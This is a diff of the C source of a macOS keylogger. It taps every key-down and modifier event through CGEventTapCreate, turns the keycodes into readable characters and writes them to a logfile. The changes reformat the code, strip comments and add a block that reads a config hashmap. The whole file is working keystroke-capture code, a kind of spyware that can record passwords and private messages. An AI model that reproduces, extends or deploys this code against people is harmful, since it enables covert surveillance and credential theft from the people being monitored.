@@ -5,23 +5,45 @@ int BATCH_SZ = 1000;
 char buffer[1000];
 int buffer_index = 0;
 
-// flush function
 void flush() {
   fwrite(buffer, 1, buffer_index, logfile);
   buffer_index = 0;
-  memset(buffer, 0, BATCH_SZ);  // clean buf
+  memset(buffer, 0, BATCH_SZ);
 }
 
 int main(int argc, const char *argv[]) {
   signal(SIGINT, flush);
   signal(SIGTERM, flush);
 
-  // Create an event tap to retrieve keypresses.
-  CGEventMask eventMask =
-      CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
-  CFMachPortRef eventTap =
-      CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask,
-                       CGEventCallback, NULL);
+  /* CONFIG */
+  struct hashmap *hm = NULL;
+  int hashmap_size = 0;
+
+  get_config(&hm, &hashmap_size);
+  for (int i = 0; i < hashmap_size; i++) {
+    printf("%s\n", hm[i].key);
+    char **args = NULL;
+    int args_length;
+
+    get_value(
+      hm, hashmap_size,
+      hm[i].key,
+      NULL, args, &args_length
+    );
+    printf("%s\n", hm[i].value);
+  }
+  /* CONFIG */
+
+
+  CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
+  CFMachPortRef eventTap = CGEventTapCreate(
+    kCGSessionEventTap,
+    kCGHeadInsertEventTap,
+    0,
+    eventMask,
+    CGEventCallback,
+    NULL
+  );
 
   // Exit the program if unable to create the event tap.
   if (!eventTap) {
@@ -30,10 +52,14 @@ int main(int argc, const char *argv[]) {
   }
 
   // Create a run loop source and add enable the event tap.
-  CFRunLoopSourceRef runLoopSource =
-      CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
-  CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource,
-                     kCFRunLoopCommonModes);
+  CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(
+    kCFAllocatorDefault, eventTap, 0
+  );
+  CFRunLoopAddSource(
+    CFRunLoopGetCurrent(),
+    runLoopSource,
+    kCFRunLoopCommonModes
+  );
   CGEventTapEnable(eventTap, true);
 
   // Clear the logfile if clear argument used or log to specific file if given.
@@ -55,11 +81,9 @@ int main(int argc, const char *argv[]) {
     exit(1);
   }
 
-  // Output to logfile.
   fprintf(logfile, "\n\nKeylogging has begun.\n");
   fflush(logfile);
 
-  // Display the location of the logfile and start the loop.
   printf("Logging to: %s\n", logfileLocation);
   fflush(stdout);
   CFRunLoopRun();
@@ -68,15 +92,16 @@ int main(int argc, const char *argv[]) {
 }
 
 // The following callback method is invoked on every keypress.
-CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type,
-                           CGEventRef event, void *refcon) {
+CGEventRef CGEventCallback(
+  CGEventTapProxy proxy,
+  CGEventType type,
+  CGEventRef event, void *refcon
+) {
   if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
     return event;
   }
 
   CGEventFlags flags = CGEventGetFlags(event);
-
-  // Retrieve the incoming keycode.
   CGKeyCode keyCode =
       (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
@@ -115,10 +140,8 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type,
   }
   lastFlags = flags;
 
-  // Only log key down events.
   if (!down) return event;
 
-  // Print the human readable key to the logfile.
   bool shift = flags & kCGEventFlagMaskShift;
   bool caps = flags & kCGEventFlagMaskAlphaShift;
   // this should be batched up in a buffer and written to the file in one go
@@ -129,8 +152,6 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type,
   return event;
 }
 
-// The following method converts the key code returned by each keypress as
-// a human readable key code in const char format.
 const char *letters_cap_set1 = "ASDFHGZXCVBQWERT";
 const char *letters_cap_set2 = "OU{IP LJ";
 const char *symbols_cap_set1 = "123465+97-80]";
